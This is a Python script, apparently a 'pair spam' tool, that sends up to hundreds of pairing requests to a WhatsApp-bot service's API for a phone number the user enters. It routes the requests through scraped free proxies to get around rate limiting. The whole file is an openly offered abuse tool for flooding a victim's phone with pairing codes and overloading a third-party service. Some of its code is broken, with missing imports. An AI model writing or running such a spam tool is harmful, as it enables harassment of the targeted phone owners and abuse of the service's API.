import time
import os


if os.path.exists("proxy.txt"):
    os.remove("proxy.txt")
    print("[*] Old proxy.txt deleted")



try:
    import requests
except ImportError:
    print("[*] Installing requests...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

# ---------- Proxy Fetcher ( max 100 + save ) ----------
def fetch_proxies():
    proxy_urls = [
        "https://raw.githubusercontent.com/thelegendofthecow/proxy-list/main/free.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
    ]
    raw_proxies = set()
    for url in proxy_urls:
        try:
            res = requests.get(url, timeout=5)
            if res.status_code == 200:
                for line in res.text.splitlines():
                    line = line.strip()
                    if line and ":" in line:
                        raw_proxies.add(line)
        except Exception:
            continue
    return list(raw_proxies)

def test_proxy(proxy, working_list):
    test_url = "http://httpbin.org/ip"
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        response = requests.get(test_url, proxies=proxies, timeout=3)
        if response.status_code == 200:
            working_list.append(f"http://{proxy}")
    except Exception:
        pass

def get_working_proxies(max_count=100):
    raw_list = fetch_proxies()
    working_proxies = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        for proxy in raw_list[:300]:
            futures.append(executor.submit(test_proxy, proxy, working_proxies))
        concurrent.futures.wait(futures)

    # trim to max_count and save
    final = working_proxies[:max_count]
    with open("proxy.txt", "w") as f:
        for p in final:
            f.write(p + "\n")
    return final

# Get 100 proxies and save
# proxies = get_working_proxies(max_count=100)

# ---------- Your integration part (DO NOT EDIT) ----------
PROXY_FILE = "proxy.txt"

def _load_proxy():
    try:
        with open(PROXY_FILE) as f:
            lines = [l.strip() for l in f if l.strip()]
        if not lines:
            return None
        p = random.choice(lines)
        return p if p.startswith("http") else f"http://{p}"
    except:
        return None

_original_request = requests.sessions.Session.request

def _patched_request(self, method, url, **kwargs):
    if "proxies" not in kwargs:
        proxy = _load_proxy()
        if proxy:
            kwargs["proxies"] = {"http": proxy, "https": proxy}
    return _original_request(self, method, url, **kwargs)

requests.sessions.Session.request = _patched_request

"""
The above code (proxy integration) is from Meta ai. Make sure not to edit this part.

"""



g = "\033[92m"
r = "\033[0m"
b = "\033[34m"
red = "\033[31m"


def banner():
    b = r"""


 ____   _    ___ ____    ____  ____   _    __  __
|  _ \ / \  |_ _|  _ \  / ___||  _ \ / \  |  \/  |
| |_) / _ \  | || |_) | \___ \| |_) / _ \ | |\/| |
|  __/ ___ \ | ||  _ <   ___) |  __/ ___ \| |  | |
|_| /_/   \_\___|_| \_\ |____/|_| /_/   \_\_|  |_|

                  BY ERRORKING404
"""

    print(f"{g}{b}{r}")


url = "https://whatsbot.hostify.co.zw/api/pair"
headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Accept": "*/*",
    "Accept-Language": "en-US,es-US,ur-PK",
    "Content-Type": "application/json",
    "Origin": "https://whatsbot.hostify.co.zw",
    "Referer": "https://whatsbot.hostify.co.zw/",
    "Accept-Encoding": "gzip, deflate, br",
}


def pair(number):
    try:
        resp = requests.post(url, headers=headers, json={"number": number}, timeout=15)

        if resp.status_code == 200:
            print(f"[SUCCESS {resp.status_code}]")
            try:
                return resp.json()
            except:
                return resp.text
        else:
            print(f"[ERROR {resp.status_code}] Failed. Try again later.")
            print(resp.text[:800])
            return None

    except requests.exceptions.RequestException as e:
        print(f"[NETWORK ERROR] {e} - Try again later")
        return None
    except Exception as e:
        print(f"[ERROR] {e} - Try again later")
        return None


banner()
number = input("Enter number. e.g:923xxx:")
lim = int(input("Enter limit. e.g: 500:"))
for i in range(1, lim + 1):
    print(f"{g}\nAttempt {i} for {number}...{r}")
    result = pair(number)
    if result:
        print(f"{g} Success.{r}")
        
    time.sleep(2)
